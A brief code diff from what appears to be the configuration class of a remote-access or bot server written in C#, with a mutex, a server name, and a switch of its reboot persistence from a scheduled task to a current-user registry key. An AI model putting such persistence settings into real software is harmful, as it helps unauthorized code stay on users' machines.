@@ -15,10 +15,8 @@ namespace bc.srv.Classes
             SrvData.Instance.ServerName = "imback";
             SrvData.Instance.sMutex = "tUOns2DB6";
 
-
-
-            SrvData.Instance.UseTaskScheduler = true;
-            SrvData.Instance.BUseHkcu = false;
+            SrvData.Instance.UseTaskScheduler = false;
+            SrvData.Instance.BUseHkcu = true;
             SrvData.Instance.bUseExplorer = false;
             SrvData.Instance.bUseStartupFolder = false;
 
